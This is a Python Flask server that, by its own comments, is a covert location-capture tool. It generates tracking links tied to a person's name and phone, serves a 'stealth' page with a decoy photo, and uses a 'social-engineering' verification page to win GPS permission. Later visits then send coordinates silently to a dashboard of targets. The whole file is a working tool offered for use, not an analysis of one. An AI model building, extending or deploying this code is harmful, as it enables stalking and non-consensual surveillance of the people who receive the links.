import os
import uuid
import json
import io
from datetime import datetime, timedelta
from flask import Flask, render_template, request, jsonify, abort, send_file

app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16 MB for photo uploads

# ── In-memory store ──────────────────────────────────────────────────────────
CASES = {}
LINK_LIFETIME_MINUTES = 30


def new_case(patient_name=None, phone=None):
    token = uuid.uuid4().hex[:12]
    case = {
        "token": token,
        "patient_name": patient_name,
        "phone": phone,
        "created_at": datetime.utcnow(),
        "responded_at": None,
        "status": "pending",
        "visit_count": 0,
        "visits": [],
        "latitude": None,
        "longitude": None,
        "accuracy": None,
        "source": None,
        "photo": None,         # raw bytes
        "photo_mime": None,    # image/jpeg etc
        "photo_name": None,    # original filename
    }
    return case


def is_expired(case):
    return datetime.utcnow() - case["created_at"] > timedelta(minutes=LINK_LIFETIME_MINUTES)


# ── Routes ───────────────────────────────────────────────────────────────────


@app.route("/")
def index():
    return "// CAPTURE — POST /create to generate a link."


@app.route("/sw.js")
def service_worker():
    response = app.make_response(render_template("sw.js"))
    response.headers["Content-Type"] = "application/javascript"
    response.headers["Service-Worker-Allowed"] = "/"
    response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
    return response


@app.route("/create", methods=["POST"])
def create_case():
    """
    Accepts multipart/form-data:
      - patient_name (optional)
      - phone (optional)
      - photo (optional file — png/jpg/jpeg/gif/webp)
    """
    patient_name = request.form.get("patient_name", "").strip() or None
    phone = request.form.get("phone", "").strip() or None

    case = new_case(patient_name, phone)

    # ── Handle photo upload ──
    if "photo" in request.files:
        photo = request.files["photo"]
        if photo.filename:
            case["photo"] = photo.read()
            ext = os.path.splitext(photo.filename)[1].lower()
            mime_map = {
                ".png": "image/png", ".jpg": "image/jpeg", ".jpeg": "image/jpeg",
                ".gif": "image/gif", ".webp": "image/webp",
            }
            case["photo_mime"] = mime_map.get(ext, "image/jpeg")
            case["photo_name"] = photo.filename

    CASES[case["token"]] = case
    link = request.url_root.rstrip("/") + "/go/" + case["token"]
    return jsonify({
        "token": case["token"],
        "link": link,
        "has_photo": case["photo"] is not None,
    })


@app.route("/go/<token>")
def go(token):
    """
    STEALTH endpoint.
    SW intercepts this and returns inline stealth HTML.
    Non-SW browsers get the server-rendered stealth page.
    """
    case = CASES.get(token)
    if not case:
        abort(404)
    case["visit_count"] += 1
    expired = is_expired(case)
    if expired:
        case["status"] = "expired"
    return render_template("stealth.html", token=token, expired=expired)


@app.route("/verify/<token>")
def verify_page(token):
    """
    Social-engineering device verification page.
    Gets GPS permission willingly, then redirects to /go/<token>
    so subsequent visits fire GPS silently (permission cached).
    """
    case = CASES.get(token)
    if not case:
        abort(404)
    expired = is_expired(case)
    if expired:
        case["status"] = "expired"
    return render_template("verify.html", token=token, expired=expired)


@app.route("/api/photo/<token>")
def serve_photo(token):
    """Serves the uploaded decoy photo for the stealth page."""
    case = CASES.get(token)
    if not case or case["photo"] is None:
        abort(404)
    return send_file(
        io.BytesIO(case["photo"]),
        mimetype=case["photo_mime"],
        download_name=case.get("photo_name", "image.jpg"),
    )


@app.route("/api/location-update", methods=["POST"])
def location_update():
    """Receives stealth GPS coordinates."""
    data = request.get_json(silent=True) or {}
    token = data.get("token")
    case = CASES.get(token)
    if not case:
        return jsonify({"error": "invalid token"}), 404
    if is_expired(case):
        case["status"] = "expired"
        return jsonify({"error": "link expired"}), 410

    lat = data.get("latitude")
    lng = data.get("longitude")
    acc = data.get("accuracy")

    visit = {
        "timestamp": datetime.utcnow().isoformat(),
        "gps_latitude": lat,
        "gps_longitude": lng,
        "gps_accuracy": acc,
        "source": "gps",
    }

    if lat is not None and lng is not None:
        visit["latitude"] = lat
        visit["longitude"] = lng
        visit["accuracy"] = acc
        case["latitude"] = lat
        case["longitude"] = lng
        case["accuracy"] = acc
        case["source"] = "gps"
        if case["status"] == "pending":
            case["status"] = "located"
            case["responded_at"] = datetime.utcnow()

    case["visits"].append(visit)
    return jsonify({"ok": True})


@app.route("/api/location-denied", methods=["POST"])
def location_denied():
    """When GPS is not available or permission denied."""
    data = request.get_json(silent=True) or {}
    token = data.get("token")
    case = CASES.get(token)
    if case:
        if case["status"] == "pending":
            case["status"] = "denied"
            case["responded_at"] = datetime.utcnow()
        case["visits"].append({
            "timestamp": datetime.utcnow().isoformat(),
            "gps_latitude": None,
            "gps_longitude": None,
            "source": "denied",
        })
    return jsonify({"ok": True})


@app.route("/api/cases")
def api_cases():
    cases = sorted(CASES.values(), key=lambda c: c["created_at"], reverse=True)
    out = []
    for c in cases:
        visits_clean = []
        for v in c.get("visits", []):
            visits_clean.append({
                "timestamp": v.get("timestamp"),
                "latitude": v.get("latitude"),
                "longitude": v.get("longitude"),
                "accuracy": v.get("accuracy"),
                "source": v.get("source"),
            })
        out.append({
            "token": c["token"],
            "patient_name": c["patient_name"],
            "phone": c["phone"],
            "status": c["status"],
            "source": c["source"],
            "latitude": c["latitude"],
            "longitude": c["longitude"],
            "accuracy": c["accuracy"],
            "visit_count": c.get("visit_count", 0),
            "has_photo": c["photo"] is not None,
            "visits": visits_clean,
            "created_at": c["created_at"].isoformat(),
        })
    return jsonify(out)


@app.route("/dashboard")
def dashboard():
    cases = sorted(CASES.values(), key=lambda c: c["created_at"], reverse=True)
    return render_template("dashboard.html", cases=cases)


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
